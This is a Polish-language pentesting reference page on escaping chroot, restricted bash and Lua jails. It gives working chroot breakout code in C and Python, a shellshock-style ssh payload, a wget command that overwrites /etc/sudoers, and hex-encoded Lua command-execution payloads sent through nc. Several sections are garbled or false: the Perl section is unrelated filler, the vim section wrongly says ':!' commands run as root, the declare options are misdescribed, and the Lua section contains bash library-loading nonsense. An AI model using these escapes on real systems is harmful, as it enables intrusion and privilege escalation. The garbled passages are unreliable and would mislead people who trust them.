# Escaping from Jails

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów github.**

</details>

## **GTFOBins**

**Szukaj w** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać dowolny plik binarny z właściwością "Shell"**

## Ucieczki z Chroot

Z [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie ma na celu obrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. W większości systemów konteksty chroot nie są poprawnie stosowane i programy w chroocie **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zazwyczaj oznacza to, że aby uciec, musisz być rootem wewnątrz chroota.

{% hint style="success" %}
**Narzędzie** [**chw00t**](https://github.com/earthquake/chw00t) zostało stworzone do wykorzystania poniższych scenariuszy i ucieczki z `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Jeśli jesteś **rootem** wewnątrz chroota, **możesz uciec**, tworząc **inny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą istnieć jednocześnie (w systemie Linux), więc jeśli utworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze będąc **na zewnątrz niego**, będziesz teraz **na zewnątrz nowego chroota** i tym samym znajdziesz się w systemie plików.

Dzieje się tak, ponieważ zazwyczaj chroot NIE przenosi twojego bieżącego katalogu roboczego do wskazanego, więc możesz utworzyć chroot, ale być na zewnątrz niego.
{% endhint %}

Zazwyczaj nie znajdziesz binarnego pliku `chroot` wewnątrz więzienia chroot, ale **możesz skompilować, przesłać i wykonać** plik binarny:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````

</details>

<details>

<summary>Perl</summary>

Perl jest językiem skryptowym, który może być używany do ucieczki z ograniczonego powłoki bash. Można to zrobić, wykorzystując funkcję system() w Perl, która pozwala na wykonanie poleceń systemowych. Aby to zrobić, należy utworzyć skrypt Perl, który wywołuje polecenie, które chcemy uruchomić w powłoce bash. Następnie, używając funkcji system(), wykonujemy ten skrypt Perl z powłoki bash, co pozwala nam na wykonanie polecenia z uprawnieniami użytkownika, który uruchomił skrypt Perl.

Oto przykładowy skrypt Perl, który wykonuje polecenie "whoami":

```perl
#!/usr/bin/perl
system("whoami");
```

Aby uruchomić ten skrypt Perl z powłoki bash, używamy następującego polecenia:

```bash
perl skrypt.pl
```

To spowoduje wykonanie polecenia "whoami" z uprawnieniami użytkownika, który uruchomił skrypt Perl.

</details>

\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`

### Root + Zapisany deskryptor pliku

{% hint style="warning" %}
To jest podobne do poprzedniego przypadku, ale w tym przypadku **atakujący przechowuje deskryptor pliku do bieżącego katalogu**, a następnie **tworzy chroot w nowym folderze**. Na koniec, ponieważ ma **dostęp** do tego **deskryptora pliku poza** chrootem, uzyskuje do niego dostęp i **ucieka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (Unix Domain Sockets)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD można przekazywać przez Unix Domain Sockets, więc:

* Utwórz proces potomny (fork)
* Utwórz UDS, aby rodzic i potomek mogli się komunikować
* Uruchom chroot w procesie potomnym w innym folderze
* W procesie rodzica utwórz FD folderu, który znajduje się poza chroot nowego procesu potomnego
* Przekaż do procesu potomnego ten FD za pomocą UDS
* Proces potomny zmienia bieżący katalog na ten FD i ponieważ znajduje się poza chroot, ucieknie z więzienia

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Zamontuj urządzenie root (/) w katalogu wewnątrz chroot
* Uruchom chroot w tym katalogu

To jest możliwe w systemie Linux

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Zamontuj procfs w katalogu wewnątrz chroot (jeśli jeszcze nie jest zamontowany)
* Znajdź pid, który ma inną ścieżkę root/cwd, na przykład: /proc/1/root
* Uruchom chroot w tej ścieżce

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Utwórz Fork (proces potomny) i uruchom chroot w innym folderze głębiej w systemie plików, a następnie zmień bieżący katalog na ten folder
* Z procesu rodzica przenieś folder, w którym znajduje się proces potomny, do folderu poprzedzającego chroot procesu potomnego
* Ten proces potomny znajdzie się poza chroot

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Kiedyś użytkownicy mogli debugować swoje własne procesy z procesu tego samego użytkownika... ale teraz domyślnie nie jest to możliwe
* W każdym razie, jeśli jest to możliwe, można użyć ptrace do debugowania procesu i wykonania w nim shellcode'u ([zobacz ten przykład](linux-capabilities.md#cap\_sys\_ptrace)).

</div>

## Bash Jails

### Wyliczanie

Uzyskaj informacje na temat więzienia:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### Modyfikacja PATH

Sprawdź, czy możesz zmodyfikować zmienną środowiskową PATH.

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### Używanie vim

W przypadku, gdy jesteś ograniczony do korzystania z powłoki bash, ale masz dostęp do edytora vim, istnieje kilka sposobów na uniknięcie tych ograniczeń i uzyskanie większych uprawnień.

**1. Uruchomienie polecenia z uprawnieniami roota**

Możesz uruchomić polecenie z uprawnieniami roota, korzystając z funkcji `:!`. Na przykład, aby uruchomić polecenie `id` jako root, wpisz `:!id`.

**2. Uruchomienie powłoki z uprawnieniami roota**

Możesz uruchomić powłokę z uprawnieniami roota, korzystając z funkcji `:shell`. Wpisanie `:shell` spowoduje otwarcie nowej powłoki, w której będziesz miał większe uprawnienia. Aby wrócić do vim, wpisz `exit`.

**3. Wykonanie poleceń z uprawnieniami roota w trybie wsadowym**

Możesz wykonywać polecenia z uprawnieniami roota w trybie wsadowym, korzystając z funkcji `:w !sudo tee %`. Na przykład, aby zapisać plik jako root, wpisz `:w !sudo tee %`.

**4. Wykonanie poleceń z uprawnieniami roota w trybie wsadowym bez hasła**

Jeśli masz uprawnienia do wykonywania poleceń jako root bez podawania hasła, możesz skorzystać z funkcji `:w !sudo -S tee %`. Wpisanie `:w !sudo -S tee %` spowoduje zapisanie pliku jako root bez konieczności podawania hasła.

**5. Wykonanie dowolnego polecenia**

Możesz wykonywać dowolne polecenia, korzystając z funkcji `:!<command>`. Na przykład, aby uruchomić polecenie `ls -la`, wpisz `:!ls -la`.

**6. Wykonanie dowolnego polecenia i wstawienie wyniku do pliku**

Możesz wykonywać dowolne polecenia i wstawiać wynik do pliku, korzystając z funkcji `:r !<command>`. Na przykład, aby wstawić wynik polecenia `ls -la` do pliku, wpisz `:r !ls -la`.

**7. Wykonanie dowolnego polecenia i wstawienie wyniku do bieżącego pliku**

Możesz wykonywać dowolne polecenia i wstawiać wynik do bieżącego pliku, korzystając z funkcji `:r !<command>`. Na przykład, aby wstawić wynik polecenia `ls -la` do bieżącego pliku, wpisz `:r !ls -la`.

**8. Wykonanie dowolnego polecenia i wstawienie wyniku do nowej linii**

Możesz wykonywać dowolne polecenia i wstawiać wynik do nowej linii, korzystając z funkcji `:put=system('<command>')`. Na przykład, aby wstawić wynik polecenia `ls -la` do nowej linii, wpisz `:put=system('ls -la')`.

**9. Wykonanie dowolnego polecenia i wstawienie wyniku jako tekst**

Możesz wykonywać dowolne polecenia i wstawiać wynik jako tekst, korzystając z funkcji `:let @a = system('<command>')`. Na przykład, aby wstawić wynik polecenia `ls -la` jako tekst, wpisz `:let @a = system('ls -la')`, a następnie wstaw tekst, używając polecenia `"+p`.

**10. Wykonanie dowolnego polecenia i wstawienie wyniku jako nowy bufor**

Możesz wykonywać dowolne polecenia i wstawiać wynik jako nowy bufor, korzystając z funkcji `:new | r !<command>`. Na przykład, aby wstawić wynik polecenia `ls -la` jako nowy bufor, wpisz `:new | r !ls -la`.

```bash
:set shell=/bin/sh
:shell
```

#### Utwórz skrypt

Sprawdź, czy możesz utworzyć plik wykonywalny o zawartości _/bin/bash_.

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### Uzyskaj dostęp do basha przez SSH

Jeśli uzyskujesz dostęp za pomocą SSH, możesz skorzystać z tego triku, aby uruchomić powłokę bash:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### Zadeklaruj

```bash
declare [-aAfFgilnrtux] [-p] [name[=value] ...]
```

Komenda `declare` służy do deklarowania zmiennych i funkcji w powłoce Bash. Może być używana do tworzenia nowych zmiennych, nadawania wartości istniejącym zmiennym, a także do deklarowania funkcji.

Opcje:

* `-a` - deklaruje zmienną jako tablicę
* `-A` - deklaruje zmienną jako tablicę asocjacyjną
* `-f` - deklaruje zmienną jako funkcję
* `-F` - deklaruje zmienną jako funkcję tylko do odczytu
* `-g` - deklaruje zmienną jako globalną
* `-i` - deklaruje zmienną jako liczbę całkowitą
* `-l` - deklaruje zmienną jako zmienną lokalną
* `-n` - deklaruje zmienną jako tylko do odczytu
* `-r` - deklaruje zmienną jako tylko do odczytu
* `-t` - deklaruje zmienną jako tablicę związanych zadaniami
* `-u` - deklaruje zmienną jako tylko do odczytu
* `-x` - deklaruje zmienną jako eksportowaną

Opcja `-p` wyświetla wartości wszystkich zmiennych zadeklarowanych w bieżącej powłoce.

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

Możesz nadpisać na przykład plik sudoers.

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### Inne sztuczki

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Może być również interesująca strona:**

### Więzienia Pythona

Sztuczki dotyczące ucieczki z więzień Pythona znajdują się na następującej stronie:

### Więzienia Lua

Na tej stronie znajdziesz globalne funkcje, do których masz dostęp wewnątrz Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval z wykonaniem polecenia:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Kilka sztuczek, aby **wywoływać funkcje biblioteki bez użycia kropek**:

1.  Użyj polecenia `source` lub kropki (`.`) do załadowania biblioteki do bieżącego środowiska powłoki. Na przykład, jeśli biblioteka nazywa się `libexample.so`, wykonaj następujące polecenie:

    ```bash
    source libexample.so
    ```

    lub

    ```bash
    . libexample.so
    ```
2.  Wykorzystaj polecenie `declare` do zadeklarowania funkcji z biblioteki jako funkcji bieżącego środowiska powłoki. Na przykład, jeśli funkcja nazywa się `example_function` w bibliotece `libexample.so`, wykonaj następujące polecenie:

    ```bash
    declare -f example_function
    ```
3.  Użyj polecenia `eval` do wykonania funkcji z biblioteki. Na przykład, jeśli funkcja nazywa się `example_function` w bibliotece `libexample.so`, wykonaj następujące polecenie:

    ```bash
    eval example_function
    ```

Pamiętaj, że te techniki mogą być użyteczne w przypadku, gdy nie masz dostępu do pełnej ścieżki do biblioteki lub gdy chcesz uniknąć użycia kropek w celu wywołania funkcji.

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Wylicz funkcje biblioteki:

```bash
for k,v in pairs(string) do print(k,v) end
```

Zauważ, że za każdym razem, gdy wykonasz powyższą jednoliniową komendę w **innym środowisku Lua, kolejność funkcji się zmienia**. Dlatego jeśli musisz wykonać konkretną funkcję, możesz przeprowadzić atak brute force, ładować różne środowiska Lua i wywoływać pierwszą funkcję biblioteki "le":

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Uzyskaj interaktywną powłokę lua**: Jeśli znajdujesz się w ograniczonej powłoce lua, możesz uzyskać nową powłokę lua (i miejmy nadzieję nieograniczoną) wykonując poniższe polecenie:

```bash
debug.debug()
```

### Odwołania

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdy: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
